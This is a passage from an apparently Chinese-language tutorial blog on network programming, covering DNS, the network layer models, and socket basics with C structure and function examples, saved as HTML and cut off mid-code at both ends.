comment">/* Echo service.  */</span>    IPPORT_DISCARD <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">,</span>   <span class="token comment">/* Discard transmissions service.  */</span>    IPPORT_SYSTAT <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">,</span>   <span class="token comment">/* System status service.  */</span>    IPPORT_DAYTIME <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token comment">/* Time of day service.  */</span>    IPPORT_NETSTAT <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token comment">/* Network status service.  */</span>    IPPORT_FTP <span class="token operator">=</span> <span class="token number">21</span><span class="token punctuation">,</span>    <span class="token comment">/* File Transfer Protocol.  */</span>    IPPORT_TELNET <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">,</span>   <span class="token comment">/* Telnet protocol.  */</span>    IPPORT_SMTP <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">,</span>   <span class="token comment">/* Simple Mail Transfer Protocol.  */</span>    IPPORT_TIMESERVER <span class="token operator">=</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token comment">/* Timeserver service.  */</span>    IPPORT_NAMESERVER <span class="token operator">=</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token comment">/* Domain Name Service.  */</span>    IPPORT_WHOIS <span class="token operator">=</span> <span class="token number">43</span><span class="token punctuation">,</span>    <span class="token comment">/* Internet Whois service.  */</span>    IPPORT_MTP <span class="token operator">=</span> <span class="token number">57</span><span class="token punctuation">,</span>    IPPORT_TFTP <span class="token operator">=</span> <span class="token number">69</span><span class="token punctuation">,</span>   <span class="token comment">/* Trivial File Transfer Protocol.  */</span>    IPPORT_RJE <span class="token operator">=</span> <span class="token number">77</span><span class="token punctuation">,</span>    IPPORT_FINGER <span class="token operator">=</span> <span class="token number">79</span><span class="token punctuation">,</span>   <span class="token comment">/* Finger service.  */</span>    IPPORT_TTYLINK <span class="token operator">=</span> <span class="token number">87</span><span class="token punctuation">,</span>    IPPORT_SUPDUP <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">,</span>   <span class="token comment">/* SUPDUP protocol.  */</span>    IPPORT_EXECSERVER <span class="token operator">=</span> <span class="token number">512</span><span class="token punctuation">,</span>  <span class="token comment">/* execd service.  */</span>    IPPORT_LOGINSERVER <span class="token operator">=</span> <span class="token number">513</span><span class="token punctuation">,</span> <span class="token comment">/* rlogind service.  */</span>    IPPORT_CMDSERVER <span class="token operator">=</span> <span class="token number">514</span><span class="token punctuation">,</span>    IPPORT_EFSSERVER <span class="token operator">=</span> <span class="token number">520</span><span class="token punctuation">,</span>    <span class="token comment">/* UDP ports.  */</span>    IPPORT_BIFFUDP <span class="token operator">=</span> <span class="token number">512</span><span class="token punctuation">,</span>    IPPORT_WHOSERVER <span class="token operator">=</span> <span class="token number">513</span><span class="token punctuation">,</span>    IPPORT_ROUTESERVER <span class="token operator">=</span> <span class="token number">520</span><span class="token punctuation">,</span>    <span class="token comment">/* Ports less than this value are reserved for privileged processes.  */</span>    IPPORT_RESERVED <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">,</span>    <span class="token comment">/* Ports greater this value are reserved for (non-privileged) servers.  */</span>    IPPORT_USERRESERVED <span class="token operator">=</span> <span class="token number">5000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>​</p><h4 id="1-1-5-域名系统">1.1.5 域名系统</h4><ul><li><p>IP 协议的职责是<strong>网际互连</strong>，它对物理网卡的 MAC 地址做了一层抽象，只要每个小网络在 IP 地址这个概念上达成一致，不管在 MAC 层有多大的差异，都可以接入 TCP/IP 协议栈，终汇合进整个互联网</p></li><li><p>但数字形式的地址对于人类来说却既难以记忆又难以输入，于是<strong>域名系统</strong><code>Domain Name System</code>出现了，用有意义的名字来作为 IP 地址的等价替代，在 IP 地址之上再进行一次抽象</p></li></ul><p>​</p><h5 id="域名的形式">域名的形式</h5><ul><li><p>在 DNS 中，<strong>域名</strong><code>Domain Name</code>又称为<strong>主机名</strong><code>Host</code></p></li><li><p>全球域名按照从大到小的结构，形成了一棵树状结构，实际访问一个域名时，是从最底层开始写起，域名用 <code>.</code> 分隔成多个单词，级别从左到右逐级升高，最右边的被称为<strong>顶级域名</strong></p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210129-domain-name.png" alt=""></p></li><li><p>域名还有许多其他的用途：在Web服务器中，域名可以用来标识虚拟主机，决定由哪个虚拟主机来对外提供服务，比如在 Nginx 里就会使用<code>server_name</code>指令：</p><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span>        <span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span>                <span class="token comment"># 监听 80 端口    </span>    <span class="token keyword">server_name</span>  a<span class="token punctuation">.</span>test<span class="token punctuation">.</span>com<span class="token punctuation">;</span>  <span class="token comment"># 主机名是 a.test.com  </span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>域名本质上是个<strong>名字空间系统</strong>，使用多级域名就可以划分出不同的国家、地区、组织、公司、部门，每个域名都是独一无二的，可以作为一种身份的标识，因为这个特性，域名也被扩展到了其他应用领域</p><ul><li>比如 Java 的包机制采用域名作为命名空间</li><li><code>XML</code> 里使用 <code>URI</code> 作为名字空间，也间接使用了域名</li></ul></li></ul><p>​</p><h5 id="域名的解析">域名的解析</h5><ul><li><p>IP 地址必须转换成 MAC 地址才能访问主机，使用 TCP/IP 协议来通信要使用 IP 地址，所以需要把域名做转换，<strong>映射</strong>到它的真实 IP，这就是域名解析</p></li><li><p>DNS 的核心系统是一个三层的树状分布式服务，基本对应域名的结构：</p><ul><li><p>根域名服务器 <code>Root DNS Server</code>：管理顶级域名服务器，返回 com、net、cn 等顶级域名服务器的 IP 地址</p></li><li><p>顶级域名服务器 <code>Top-level DNS Server</code>：管理各自域名下的权威域名服务器，比如  com 顶级域名服务器可以返回 <a href="http://apple.com">apple.com</a> 域名服务器的 IP 地址</p></li><li><p>权威域名服务器 <code>Authoritative DNS Server</code>：管理自己域名下主机的 IP 地址，比如 <a href="http://apple.com">apple.com</a> 权威域名服务器可以返回 <a href="http://www.apple.com">www.apple.com</a> 的 IP 地址</p></li></ul></li><li><p>根域名服务器必须是众所周知的，目前全世界共有 13 组根域名服务器，又有数百台的镜像，保证一定能够被访问到，有了这个系统以后，任何一个域名都可以在这个树形结构里<strong>从顶至下进行查询</strong>（把域名从右到左走了一遍），获得域名对应的 IP</p><blockquote><ol><li>目前全世界有 13 组根 DNS 服务器，因为 DNS 协议里包大小的限制（512 字节），再除以 DNS 记录长度，最多 15 组，再去掉 buffer</li><li>HTTP 协议中并没有明确要求必须使用 DNS，但实际上为了方便访问互联网上的 Web 服务器，通常都会使用 DNS 来定位或标记主机名，间接地把 DNS 与 HTTP 绑在了一起</li></ol></blockquote></li><li><p>在核心 DNS 系统之外，还有两种手段用来减轻域名解析的压力，基本思路就是<strong>缓存</strong></p><ul><li><p>大公司、网络运行商都会建立自己的 DNS 服务器作为用户 DNS 查询的代理，这些服务器被称为<strong>非权威域名服务器</strong>，可以缓存之前的查询结果，如果已经有了记录，就无需再向根服务器发起查询，直接返回对应的 IP 地址，这些 DNS 服务器的数量要比核心系统的服务器多很多，而且大多部署在离用户很近的地方（比较知名的 DNS 有 Google 的<strong>8.8.8.8</strong>，Microsoft 的<strong>4.2.2.1</strong>，CloudFlare 的<strong>1.1.1.1</strong>）</p></li><li><p>操作系统里也会对 DNS 解析结果做缓存，直接在操作系统里就可以拿到 IP 地址，另外，操作系统里还有一个特殊的<strong>主机映射</strong>文件（在 Linux 里是<code>/etc/hosts</code>，在 Windows 里是<code>C:\WINDOWS\system32\drivers\etc\hosts</code>），如果操作系统在缓存里找不到 DNS 记录，就会找这个文件</p></li></ul></li></ul><blockquote><p><strong>总结</strong>：DNS 是一个树状的分布式查询系统，为了提高查询效率，外围有多级的缓存</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210129-dns-architecture.png" alt="现在的DNS架构"></p></blockquote><p>​</p><h5 id="负载均衡">负载均衡</h5><ul><li><p>重定向，对外服务的域名不变，而主机的 IP 地址变动。当主机有情况需要下线或迁移时，可以更改 DNS 记录让域名指向其他机器。</p></li><li><p><strong>基于域名实现的负载均衡</strong></p><ul><li><p>域名解析可以返回多个 IP 地址，客户端收到多个 IP 地址后，使用轮询算法依次向服务器发起请求，实现负载均衡</p></li><li><p>域名解析可以配置内部的策略，返回离客户端近的主机或者当前服务质量好的主机，在 DNS 端把请求分发到不同的服务器</p></li></ul></li></ul><p>​</p><h4 id="1-1-6-数据报和字节流">1.1.6 数据报和字节流</h4><ul><li><p>TCP又叫<strong>字节流套接字</strong><code>Stream Socket</code>，<strong>UDP</strong> 又叫<strong>数据报套接字</strong><code>Datagram Socket</code>，一般以<code>SOCK_STREAM</code>与<code>SOCK_DGRAM</code>分别表示 TCP 和 UDP 套接字，<code>Datagram Sockets</code> 有时称为无连接的 sockets<code>connectionless sockets</code></p></li><li><p>字节流套接字是可靠的，双向连接的通讯串流，TCP 通过诸如<strong>连接管理，拥塞控制，数据流与窗口管理，超时和重传</strong>等一系列精巧而详细的设计，提供了高质量的端到端的通信方式</p></li><li><p>数据报套接字也可以做到更高的可靠性，只不过这种可靠性，需要应用程序进行设计处理，比如对报文进行编号，设计 <code>Request-Ack</code> 机制，再加上重传等，在一定程度上可以达到更为高可靠的 UDP 程序</p></li></ul><p>​</p><p>​</p><h4 id="1-1-7-其他">1.1.7 其他</h4><p>​</p><p>​</p><h3 id="1-2-网络分层">1.2 网络分层</h3><h4 id="TCP-IP-网络分层模型">TCP/IP 网络分层模型</h4><ol><li><p>链接层<code>link layer</code>，负责在以太网、WiFi 这样的底层网络上发送原始数据包，工作在网卡这个层次，使用 MAC 地址来标记网络上的设备，所以有时也叫 <code>MAC</code> 层</p></li><li><p>网际层或网络互连层<code>internet layer</code>，IP 协议就处在这一层，可以在链接层的基础上，用 IP 地址取代 MAC 地址，把许许多多的局域网、广域网连接成一个虚拟的巨大网络，在这个网络里找设备时只需要把 IP 地址翻译成 MAC 地址</p></li><li><p>传输层<code>transport layer</code>，这个层次协议的职责是保证数据在 IP 地址标记的两点之间可靠地传输，是 TCP 协议工作的层次</p></li><li><p>应用层<code>application layer</code>，有各种面向具体应用的协议（如 Telnet、SSH、FTP、SMTP、<a href="https://night-candle.github.io/2021/02/04/cs-network-protocol/#toc-heading-5">HTTP</a>）</p><blockquote><p>MAC 层的传输单位是<strong>帧</strong><code>frame</code>，IP 层的传输单位是<strong>包</strong><code>packet</code>，TCP 层的传输单位是<strong>段</strong><code>segment</code>，HTTP 的传输单位则是<strong>消息</strong>或<strong>报文</strong><code>message</code>，它们可以统称为<strong>数据包</strong></p></blockquote><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210128-tcpip.png" alt=""></p></li></ol><p>​</p><h4 id="OSI-网络分层模型">OSI 网络分层模型</h4><ol><li><p><strong>物理层</strong>，网络的物理形式，例如电缆、光纤、网卡、集线器等等</p></li><li><p><strong>数据链路层</strong>，它基本相当于 TCP/IP 的链接层</p></li><li><p><strong>网络层</strong>，相当于 TCP/IP 里的网际层</p></li><li><p><strong>传输层</strong>，相当于 TCP/IP 里的传输层</p></li><li><p><strong>会话层</strong>，维护网络中的连接状态，即保持会话和同步</p></li><li><p><strong>表示层</strong>，把数据转换为合适、可理解的语法和语义</p></li><li><p><strong>应用层</strong>，面向具体的应用传输数据</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210128-osi.png" alt=""></p><blockquote><p>常用术语：</p><p><strong>四层负载均衡</strong>：工作在传输层上，基于 TCP/IP 协议的特性，例如 IP 地址、端口号等实现对后端服务器的负载均衡<br><strong>七层负载均衡</strong>：工作在应用层上，看到的是 HTTP 协议，解析 HTTP 报文里的 URI、主机名、资源类型等数据，再用适当的策略转发给后端服务器<br><strong>三层路由</strong>：设备工作在ip层，报文经过有路由功能的设备时，设备分析报文中的头部信息，拿到ip地址，根据网段范围，进行本地转发或选择下一个网关<br><strong>二层转发</strong>：设备工作在链路层，帧在经过交换机设备时，检查帧的头部信息，拿到目标mac地址，进行本地转发和广播</p></blockquote></li></ol><p>​</p><h4 id="5-层参考模型">5 层参考模型</h4><ul><li><p>TCP/IP 是一个纯软件的栈，没有网络应有的最根基的电缆、网卡等物理设备的位置，而 OSI 则补足了这个缺失，在理论层面上描述网络更加完整</p></li><li><p>OSI 的分层模型在四层以上分的太细，而 TCP/IP 实际应用时的会话管理、编码转换、压缩等和具体应用经常联系的很紧密，很难分开</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210128-map.png" alt="对应关系"></p></li><li><p>因此有了结合 OSI 和 TCP/IP 优点的 5 层参考模型</p></li></ul><p>​</p><p>​</p><h3 id="1-3-Socket-套接字">1.3 Socket 套接字</h3><h4 id="Socket-是什么？">Socket 是什么？</h4><ul><li><p><code>socket</code> 译为<strong>套接字</strong>， 在网络编程中寓意是可以通过插口接入的方式，快速完成网络连接和数据收发，它把 TCP/IP 层复杂的操作抽象为几个简单的接口供应用层调用以实现进程在网络中通信</p><blockquote><p><em>An address which specifically includes a port identifier, that is, the concatenation of an Internet Address with a TCP port.</em></p><p>To allow for many processes within a single Host to use TCP communication facilities simultaneously, the TCP provides a set of addresses or ports within each host.  <em>Concatenated with the network and host addresses from the internet communication layer, this forms a socket.  A pair of sockets uniquely identifies each connection.</em>（<a href="https://www.ietf.org/rfc/rfc793.txt">RFC793</a>）</p></blockquote></li><li><p>理解 socket</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210202-server-client.png" alt="客户端和服务器工作核心逻辑"></p><ul><li><p>服务器端初始化的过程：首先初始化 <code>socket</code>，之后需要执行 <code>bind</code> 函数，将自己的服务能力绑定在一个固定的地址和端口上，紧接着执行 <code>listen</code> 操作，将原先的 <code>socket</code> 转化为服务端的 <code>socket</code>，服务端最后阻塞在 <code>accept</code> 上，此时，服务器端已经准备就绪，等待客户端的请求</p></li><li><p>客户端需要先初始化 <code>socket</code>，再执行 <code>connect</code> 向服务器端的地址和端口发起连接请求</p><p>这个过程就是<strong>TCP 三次握手</strong><code>Three-way Handshake</code>，三次握手完成，客户端和服务器端建立连接，就进入了数据传输过程，<strong>一旦连接建立，数据的传输就不再是单向的，而是双向的</strong></p><blockquote><p>具体来说，客户端进程向操作系统内核发起 <code>write</code> 字节流写操作，内核协议栈将字节流通过网络设备传输到服务器端，服务器端从内核得到信息，将字节流从内核读入到进程中，并开始业务逻辑的处理，完成之后，服务器端再将得到的结果以同样的方式写给客户端</p></blockquote></li><li><p>四次挥手：当客户端交互完成需断开连接时，会执行 <code>close</code> 函数，内核此时会通过原先的连接链路向服务端发送一个 <code>FIN</code> 包，服务端收到之后执行被动关闭，这时候整个链路处于半关闭状态，此后服务端也会执行 <code>close</code> 函数，整个链路才会真正关闭，<strong>半关闭的状态下，发起 close 请求的一方在没有收到对方 FIN 包之前都认为连接是正常的</strong>，而在全关闭的状态下，双方都感知连接已经关闭</p></li><li><p>以上所有的操作，都是通过 <code>socket</code> 来完成的，无论是 <code>connect</code>还是 <code>accept</code>，或者 <code>read/write</code> 操作等，<strong>socket 是用来建立连接，传输数据的唯一途径</strong></p></li></ul></li></ul><p>​</p><p>​</p><h4 id="Socket-发展历史">Socket 发展历史*</h4><ul><li><p><code>socket</code> 是加州大学伯克利分校的研究人员在 20 世纪 80 年代早期提出的，所以也被叫做伯克利套接字，研究者们设想<strong>用 socket 的概念屏蔽掉底层协议栈的差别</strong></p></li><li><p>第一版实现 <code>socket</code> 的就是 <code>TCP/IP</code> 协议，最早是在 <strong>BSD 4.2 Unix 内核</strong>上实现了 socket</p></li><li><p>很快人们就发现这么一个概念带来了网络编程的便利，Linux 作为 Unix 系统的一个开源实现，很早就从头开发实现了 TCP/IP 协议，伴随着 socket 的成功，Windows 也引入了 socket 的概念，在今天的世界里，socket 成为网络互联互通的标准</p></li></ul><p>​</p><p>​</p><h4 id="套接字地址格式">套接字地址格式</h4><ul><li><p>在使用套接字时，首先要解决通信双方寻址的问题</p></li><li><p>下面是套接字的<strong>通用</strong>地址结构（适用于多种地址族）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* POSIX.1g 规范规定了地址族为 2 字节的值.  */</span><span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> sa_family_t<span class="token punctuation">;</span><span class="token comment">/* 描述通用套接字地址  */</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span><span class="token punctuation">{</span>    sa_family_t sa_family<span class="token punctuation">;</span>  <span class="token comment">/* 地址族.  16-bit*/</span>    <span class="token keyword">char</span> sa_data<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">/* 具体的地址值 112-bit */</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结构体里第一个字段是<strong>地址族</strong>，表示<strong>使用什么样的方式对地址进行解释和保存</strong>，地址族在 glibc 里的定义非常多，常用的有：</p><ul><li><p><code>AF_LOCAL</code>：表示的是本地地址，对应的是 <code>Unix</code> 套接字，这种情况一般用于本地 <code>socket</code> 通信，很多情况下也可以写成 <code>AF_UNIX</code>、<code>AF_FILE</code></p></li><li><p><code>AF_INET</code>：因特网使用的 IPv4 地址</p></li><li><p><code>AF_INET6</code>：因特网使用的 IPv6 地址</p></li></ul></li><li><p><code>AF_</code> 含义是 <code>Address Family</code>，还有以 <code>PF_</code> 表示的宏，含义是 <code>Protocol Family</code>（协议族），用 AF_ 这样的值来初始化 socket 地址，用 PF_ 这样的值来初始化 socket</p><p>在 <code>&lt;sys/socket.h&gt;</code> 头文件中可以看到这两个值是一一对应的</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* 各种地址族的宏定义  */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_UNSPEC PF_UNSPEC</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_LOCAL  PF_LOCAL</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_UNIX   PF_UNIX</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_FILE   PF_FILE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_INET   PF_INET</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_AX25   PF_AX25</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_IPX    PF_IPX</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_APPLETALK  PF_APPLETALK</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_NETROM PF_NETROM</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_BRIDGE PF_BRIDGE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_ATMPVC PF_ATMPVC</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_X25    PF_X25</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">AF_INET6  PF_INET6</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>套接字地址格式比较</strong></p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210401-address-family-compare.png" alt=""></p></li></ul><p>​</p><h5 id="IPv4-套接字格式地址">IPv4 套接字格式地址*</h5><ul><li><p>常用的 IPv4 地址族的结构</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* IPV4 套接字地址，32bit 值.  */</span><span class="token keyword">typedef</span> uint32_t in_addr_t<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">in_addr</span>  <span class="token punctuation">{</span>    in_addr_t s_addr<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">/* 描述 IPV4 的套接字地址格式  */</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span>  <span class="token punctuation">{</span>    sa_family_t sin_family<span class="token punctuation">;</span> <span class="token comment">/* 16-bit */</span>    in_port_t sin_port<span class="token punctuation">;</span>     <span class="token comment">/* 端口口  16-bit*/</span>    <span class="token keyword">struct</span> <span class="token class-name">in_addr</span> sin_addr<span class="token punctuation">;</span>    <span class="token comment">/* Internet address. 32-bit */</span>        <span class="token comment">/* 这里仅仅用作占位符，不做实际用处  */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> sin_zero<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>sockaddr_in</code>与 <code>sockaddr</code> 一样，都有一个 16-bit 的 <code>sin_family</code> 字段，对于 IPv4 来说这个值就是 <code>AF_INET</code></li><li>端口号最多是 16-bit，最大支持 $2^{16}$= 65536，支持寻址的端口号最多就是 65535</li></ul></li><li><p>IPv4 地址是一个 32-bit 的字段，最多支持的地址数就是$2^{32}$，大约是 42 亿，但随着互联网发展，全球接入的设备越来越多，地址渐渐显得不太够用了</p></li></ul><p>​</p><h5 id="IPv6-套接字地址格式">IPv6 套接字地址格式*</h5><ul><li><p>IPv6 的地址结构</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in6</span>  <span class="token punctuation">{</span>    sa_family_t sin6_family<span class="token punctuation">;</span> <span class="token comment">/* 16-bit */</span>    in_port_t sin6_port<span class="token punctuation">;</span>  <span class="token comment">/* 传输端口号 # 16-bit */</span>    uint32_t sin6_flowinfo<span class="token punctuation">;</span> <span class="token comment">/* IPv6 流控信息 32-bit*/</span>    <span class="token keyword">struct</span> <span class="token class-name">in6_addr</span> sin6_addr<span class="token punctuation">;</span>  <span class="token comment">/* IPv6 地址 128-bit */</span>    uint32_t sin6_scope_id<span class="token punctuation">;</span> <span class="token comment">/* IPv6 域 ID 32-bit */</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>整个结构体长度是 28 个字节，地址族是 <code>AF_INET6</code>，端口同 IPv4 地址一样（其中流控信息和域 IP 这两个字段，一个在 glibc 的官网上没出现，另一个是当前未使用的字段）</p></li><li><p>地址从 32 位升级到 128 位，完全解决了寻址数字不够的问题</p></li></ul><h5 id="本地套接字地址格式">本地套接字地址格式*</h5><ul><li><p>本地套接字用来做为本地进程间的通信，即 <code>AF_LOCAL</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">sockaddr_un</span> <span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> sun_family<span class="token punctuation">;</span> <span class="token comment">/* 固定为 AF_LOCAL */</span>    <span class="token keyword">char</span> sun_path<span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">/* 路径名 */</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>为什么本地套接字格式不需要端口号，而 IPv4 和 IPv6 套接字格式却需要端口号呢？</p><p><strong>一切皆文件，socket也是文件</strong>，socket基于文件操作，<strong>因此只需要根据文件路径便可区分，不需要使用端口</strong>，也正因如此，IPv4 和 IPv6 套接字地址结构的长度是固定的，而本地地址是可变的</p></blockquote></li></ul><p>​</p><p>​</p><h3 id="1-4-TCP-建立连接">1.4 TCP 建立连接</h3><h4 id="服务端准备连接">服务端准备连接</h4><p>​</p><h5 id="创建套接字">创建套接字</h5><ul><li><p>要创建一个可用的套接字，使用 socket 函数：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">socket</span><span class="token punctuation">(</span><span class="token keyword">int</span> domain<span class="token punctuation">,</span> <span class="token keyword">int</span> type<span class="token punctuation">,</span> <span class="token keyword">int</span> protocol<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>domain</code> 指 <code>PF_INET</code>、<code>PF_INET6</code> 、 <code>PF_LOCAL</code> 等，表示什么样的套接字</li><li><code>type</code> 可用的值：</li><li><code>SOCK_STREAM</code>: 表示字节流，对应 <code>TCP</code></li><li><code>SOCK_DGRAM</code>： 表示数据报，对应 <code>UDP</code></li><li><code>SOCK_RAW</code>: 表示原始套接字</li><li><code>protocol</code> 原本是用来指定通信协议，但现在基本废弃（因为协议已经通过前面两个参数指定完成，目前一般写成 0 即可）</li></ul></li></ul><p>​</p><p>​</p><h5 id="bind">bind</h5><p>​</p><ul><li><p>创建的套接字如果需要被使用，就需调用 <code>bind</code> 函数将套接字和套接字地址绑定：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> sockaddr <span class="token operator">*</span> addr<span class="token punctuation">,</span> socklen_t len<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p><code>sockaddr * addr</code>通用地址格式（但实际上传入的参数可能是 IPv4、IPv6 或者本地套接字格式）</p></li><li><p><code>len</code> 字段表示的就是传入的地址长度，是一个可变值，bind 函数会根据 <code>len</code> 字段判断传入的参数 <code>addr</code> 该怎么解析</p></li></ul><blockquote><p>BSD 设计套接字的时候 C 语言还没有<code>void *</code>的支持，所以 BSD 的设计者们设计了通用地址格式来作为支持 <code>bind</code> 和 <code>accept</code> 等这些函数的参数，对使用者来说，每次需要将 IPv4、IPv6 或者本地套接字格式转化为通用套接字格式</p></blockquote></li></ul><p>​</p><ul><li><p>设置 bind 时对地址和端口可以有多种处理方式：</p><ul><li><p><strong>把地址设置成本机 IP 地址</strong>，相当于告诉系统内核仅对目标 IP 是本机 IP 地址的包进行处理，对部署前 IP 地址不确定的问题，可以利用<strong>通配地址</strong>的能力帮助解决，IPv4 地址使用 <code>INADDR_ANY</code> 、 IPv6使用 <code>IN6ADDR_ANY</code> 来完成通配地址的设置</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> name<span class="token punctuation">;</span>name<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">htonl</span> <span class="token punctuation">(</span>INADDR_ANY<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* IPV4 通配地址 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>如果把端口设置成 0，就相当于把端口的选择权交给操作系统内核，操作系统内核会选择一个空闲的端口，完成套接字的绑定。这在服务器端不常使用，一般来说服务器端的程序要绑定到一个众所周知的端口上</p></li></ul></li></ul><p>​</p><ul><li><p>初始化 IPv4 TCP 套接字的例子</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">make_socket</span> <span class="token punctuation">(</span>uint16_t port<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> sock<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> name<span class="token punctuation">;</span>      <span class="token comment">/* 创建字节流类型的 IPV4 socket. */</span>  sock <span class="token operator">=</span> <span class="token function">socket</span> <span class="token punctuation">(</span>PF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>sock <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">perror</span> <span class="token punctuation">(</span><span class="token 